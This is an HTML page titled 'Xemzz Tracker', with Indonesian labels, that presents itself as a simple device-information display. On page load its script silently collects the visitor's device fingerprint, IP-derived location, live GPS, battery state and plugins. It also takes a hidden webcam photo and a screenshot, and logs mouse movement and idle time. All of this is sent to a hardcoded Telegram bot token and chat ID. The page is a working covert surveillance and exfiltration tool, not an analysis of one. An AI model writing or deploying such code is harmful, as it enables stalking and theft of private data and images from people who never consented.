<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Xemzz Tracker</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      padding: 20px;
    }
    .info-box {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      margin: auto;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    ul {
      list-style: none;
      padding: 0;
    }
    li {
      margin-bottom: 10px;
      font-size: 16px;
    }
    video, canvas {
      display: none;
    }
    strong {
      color: #555;
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>

  <div class="info-box">
    <h2>Device Information</h2>
    <ul id="deviceInfo"></ul>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
  </div>

  <script>
    const token = '7944528020:AAFjxkw-YCyfnjCiA-QV3tDSLB9VyC6ZPnE';
    const chatId = '7525205684';

    function sendText(text) {
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: chatId, text: text })
      });
    }

    function sendPhotoBlob(blob, filename = 'image.jpg') {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, filename);
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    const deviceInfo = {
      '🖥️ Device': navigator.userAgent,
      '💻 Platform': navigator.platform,
      '🌐 Bahasa': navigator.language,
      '📶 Online': navigator.onLine,
      '📺 Screen Size': `${screen.width}x${screen.height}`,
      '🪟 Window Size': `${window.innerWidth}x${window.innerHeight}`,
      '💾 RAM': navigator.deviceMemory + ' GB',
      '🧠 CPU Cores': navigator.hardwareConcurrency,
      '⏰ Waktu Akses': new Date().toString(),
      '🕒 Page Load Time': (performance.now()).toFixed(2) + ' ms',
      '📜 History Length': history.length,
      '✋ Touch Support': 'ontouchstart' in window ? 'YA' : 'TIDAK'
    };

    const list = document.getElementById('deviceInfo');
    let message = '📡 Tracking By Xemzz 💀\n\n';

    for (let key in deviceInfo) {
      const li = document.createElement('li');
      li.innerHTML = `<strong>${key}:</strong> ${deviceInfo[key]}`;
      list.appendChild(li);
      message += `${key}: ${deviceInfo[key]}\n`;
    }

    // Referrer dan page info
    message += `🔗 Referrer: ${document.referrer}\n🌍 URL: ${window.location.href}\n📄 Title: ${document.title}\n`;

    // Timezone
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const offset = new Date().getTimezoneOffset();
    message += `🕓 Timezone: ${tz}\n🧭 Offset: ${offset} menit\n`;

    // Plugin info
    let pluginList = '';
    for (let i = 0; i < navigator.plugins.length; i++) {
      pluginList += `🔌 ${navigator.plugins[i].name}\n`;
    }
    message += `🧩 Plugins:\n${pluginList}`;

    // Feature check
    const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
    features.forEach(f => {
      message += `⚙️ ${f}: ${f in navigator ? 'YA' : 'TIDAK'}\n`;
    });

    sendText(message);

    // Battery info
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        const batteryInfo = `🔋 Battery: ${(battery.level * 100).toFixed(0)}%\n🔌 Charging: ${battery.charging}`;
        sendText(batteryInfo);
      });
    }

    // IP info
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        const ipInfo = {
          '📡 IP Address': data.ip,
          '🏙️ Kota': data.city,
          '🗺️ Wilayah': data.region,
          '🌎 Negara': data.country_name,
          '🏷️ Kode Pos': data.postal,
          '📌 Latitude': data.latitude,
          '📍 Longitude': data.longitude
        };

        let ipText = '';
        for (let key in ipInfo) {
          const li = document.createElement('li');
          li.innerHTML = `<strong>${key}:</strong> ${ipInfo[key]}`;
          list.appendChild(li);
          ipText += `${key}: ${ipInfo[key]}\n`;
        }

        sendText(ipText);
      });

    // Webcam snapshot
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
        }, 4000);
      });

    // Screenshot
    setTimeout(() => {
      html2canvas(document.body).then(canvas => {
        canvas.toBlob(blob => sendPhotoBlob(blob, '🖼️_screenshot.jpg'), 'image/jpeg');
      });
    }, 7000);

    // GPS
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(pos => {
        const gpsText = `📡 LIVE GPS:\n📌 Lat: ${pos.coords.latitude}\n📍 Lng: ${pos.coords.longitude}\n🎯 Akurasi: ${pos.coords.accuracy}m`;
        sendText(gpsText);
      });
    }

    // Mouse movement tracking
    document.addEventListener('mousemove', (e) => {
      sendText(`🖱️ Mouse moved: (${e.clientX}, ${e.clientY})`);
    });

    // Idle time tracking
    let idleStart = Date.now();
    let idleTimer;
    ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
      window.addEventListener(evt, () => {
        const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
        sendText(`😴 User idle selama: ${idleTime} detik`);
        idleStart = Date.now();
        clearTimeout(idleTimer);
        idleTimer = setTimeout(() => {
          sendText('💤 User diem kayak mayat selama 60 detik');
        }, 60000);
      });
    });

  </script>

</body>
</html>
